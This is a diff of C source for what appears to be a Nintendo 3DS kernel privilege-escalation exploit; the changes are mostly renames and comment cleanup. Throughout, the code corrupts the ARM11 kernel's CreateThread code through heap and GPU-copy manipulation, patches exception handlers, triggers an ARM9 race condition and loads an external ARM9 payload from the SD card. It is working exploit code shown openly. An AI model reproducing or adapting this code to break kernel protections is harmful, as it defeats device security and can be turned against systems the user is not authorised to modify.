@@ -93,7 +93,7 @@ int get_exploit_data(struct exploit_data *data) {
 	APT_CheckNew3DS(NULL, &isN3DS);
 	sysmodel = isN3DS ? SYS_MODEL_NEW_3DS : SYS_MODEL_OLD_3DS;
 	
-	for(i=0; i<sizeof(supported_systems)/sizeof(supported_systems[0]); i++) {
+	for(i=0; i < sizeof(supported_systems)/sizeof(supported_systems[0]); i++) {
 		if (supported_systems[i].kernel_version == kversion &&
 			supported_systems[i].sys_model & sysmodel) {
 				memcpy(data, &supported_systems[i], sizeof(struct exploit_data));
@@ -104,8 +104,8 @@ int get_exploit_data(struct exploit_data *data) {
 	return result;
 }
 
-/* Corrupts arm11 kernel code (CreateThread()) in order to
-   open a door for arm11 code execution with kernel privileges.
+/* Corrupts ARM11 kernel code (CreateThread()) in order to
+   open a door for ARM11 code execution with kernel privileges.
 */
 int corrupt_arm11_kernel_code(void) {
 	int i;
@@ -114,6 +114,9 @@ int corrupt_arm11_kernel_code(void) {
 	int diff;
 	u32 saved_heap[8];
 	volatile u32 hax;
+	u32 tmp_addr;
+	u32 mem_hax_mem;
+	
 		
 	// TODO ;-)
 	diff = heap0_get_diff();
@@ -122,14 +125,11 @@ int corrupt_arm11_kernel_code(void) {
 		return 0;		
 	}
 
-	// data required by arm11 kernel code
+	// data required by ARM11 kernel code
 	arm11shared.va_hook1_ret = ed.va_hook1_ret;
 	arm11shared.va_pdn_regs = ed.va_pdn_regs;
 	arm11shared.va_pxi_regs = ed.va_pxi_regs;
 
-	u32 tmp_addr;
-	u32 mem_hax_mem;
-	
 	svcControlMemory(&mem_hax_mem, 0, 0, 0x2000, MEMOP_ALLOC_LINEAR, 0x3);
 	u32 mem_hax_mem_free = mem_hax_mem + 0x1000;
 	svcControlMemory(&tmp_addr, mem_hax_mem_free, 0, 0x1000, MEMOP_FREE, 0); 
@@ -149,10 +149,7 @@ int corrupt_arm11_kernel_code(void) {
 	// Trigger write to kernel. This will actually cause
 	// the CreateThread() kernel code to be corrupted 
 	svcControlMemory(&tmp_addr, mem_hax_mem, 0, 0x1000, MEMOP_FREE, 0);
-
-	//gfxFlushBuffers();
-	//gfxSwapBuffers();
-    
+   
 	// restore heap
 	memcpy(arm11_buffer, saved_heap, sizeof(saved_heap));
 	do_gshax_copy(mem_hax_mem, arm11_buffer, 0x20u);
@@ -165,17 +162,13 @@ int corrupt_arm11_kernel_code(void) {
 	nop_func = nop_slide;
 
 	do_gshax_copy(nop_slide, arm11_buffer, sizeof(nop_slide));
-
 	nop_func();
-
-	gfxFlushBuffers();
-	gfxSwapBuffers();
 
 	return 1;
 }
 
-// reads arm9 code from a given path
-int load_arm9_binary(char *filename, void *buf, u32 buf_size, u32 *out_size) {
+// reads ARM9 code from a given path
+int load_arm9_payload(char *filename, void *buf, u32 buf_size, u32 *out_size) {
 	int result = 0;
 	u32 fsize = 0;
 	
@@ -196,15 +189,15 @@ int load_arm9_binary(char *filename, void *buf, u32 buf_size, u32 *out_size) {
 	return result;
 }
 
-/* copies externally loaded arm9 payload to fcram
-   - Please note that the arm11 payload copies
-     the original arm9 entry point from the mapped
-	 FIRM header to offset 4 of the arm9 payload.
-	 Thus, the arm9 payload should consist of
+/* copies externally loaded ARM9 payload to FCRAM
+   - Please note that the ARM11 payload copies
+     the original ARM9 entry point from the mapped
+	 FIRM header to offset 4 of the ARM9 payload.
+	 Thus, the ARM9 payload should consist of
 	 - a branch instruction at offset 0 and
-	 - a placeholder (u32) at offset 4 (arm9 entrypoint)  
+	 - a placeholder (u32) at offset 4 (=ARM9 entrypoint)  
 */ 
-int map_arm9_code(void) {
+int map_arm9_payload(void) {
 	extern u32 arm9_start[];
 	extern u32 arm9_end[];
 
@@ -238,7 +231,7 @@ void exploit_arm9_race_condition() {
 	
 	asm volatile ("clrex");
 
-	/* copy arm11 payload to lower, writable mirror of
+	/* copy ARM11 payload to lower, writable mirror of
 	   mapped exception handlers*/
 	dst = (u32 *)(ed.va_exc_handler_base_W + OFFS_EXC_HANDLER_UNUSED);
 	for (src = arm11_start; src != arm11_end;) {
@@ -258,10 +251,10 @@ void exploit_arm9_race_condition() {
 			src++;		
 	}
 
-	/* copy arm9 payload to FCRAM */
-	map_arm9_code();
+	/* copy ARM9 payload to FCRAM */
+	map_arm9_payload();
 
-	// patch arm11 kernel	 
+	// patch ARM11 kernel	 
 	redirect_codeflow(ed.va_exc_handler_base_X +
 	                  OFFS_EXC_HANDLER_UNUSED,
 	                  ed.va_patch_hook1);
@@ -273,7 +266,7 @@ void exploit_arm9_race_condition() {
 	CleanEntireDataCache();
 	InvalidateEntireInstructionCache();
 
-	// trigger arm9 code execution
+	// trigger ARM9 code execution
 	_KernelSetState(0, 0, 2, 0);	
 }
 
@@ -340,7 +333,7 @@ int run_exploit() {
 			printf("[+] Loading ARM9 payload\n");
 			
 			// if present in SD root, load arm9payload.bin 
-			sd_arm9_loaded = load_arm9_binary("/arm9payload.bin",
+			sd_arm9_loaded = load_arm9_payload("/arm9payload.bin",
 											&sd_arm9_buf,
 											sizeof(sd_arm9_buf),
 											&sd_arm9_size);
